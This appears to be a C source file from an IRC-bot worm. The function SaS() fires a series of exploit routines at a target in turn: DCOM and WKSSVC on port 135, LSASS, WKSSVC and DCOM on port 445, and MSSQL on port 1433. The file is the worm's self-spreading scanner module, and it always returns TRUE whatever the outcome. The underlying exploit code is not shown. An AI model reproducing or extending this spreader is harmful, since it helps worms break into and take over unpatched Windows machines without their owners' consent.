/*
	Scans lsass, all dcom, all wkssvc, lsass, mssql - (based off old dcass code) - DISTS
*/

#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_WKSSVC
#ifndef NO_MSSQL
#ifndef NO_SAS
#ifndef NO_DCOM135LSASS
#ifndef NO_MSSQLLSASS
#ifndef NO_WKSMASS
BOOL SaS(EXINFO exinfo)
{

	exinfo.port = 135;
	BOOL bDCOM135 = dcom(exinfo);
	exinfo.port = 135;
	BOOL bWKSSVC = ScriptGod_WKSSVC_Other(exinfo);
	exinfo.port = 135;
	BOOL bWKSSVC2 = ScriptGod_WKSSVC_Eng(exinfo);
    exinfo.port = 445;
    BOOL bDCASS = dcom135lsass(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);
    exinfo.port = 445;
    BOOL bWKS = WKSMASS(exinfo);
	exinfo.port = 445;
	BOOL bDCOM445 = dcom(exinfo);
    exinfo.port = 1433;
    BOOL bMSASS = mssqllsass(exinfo);
	exinfo.port = 1433;
	BOOL bMSSQL = MSSQL(exinfo);

	return bMSASS || bWKS ||bDCASS || bDCOM445 || bLSASS || bDCOM135 || bWKSSVC || bWKSSVC2 || bMSSQL  ? TRUE : TRUE;
}
#endif
#endif
#endif
#endif
#endif
#endif
#endif
#endif

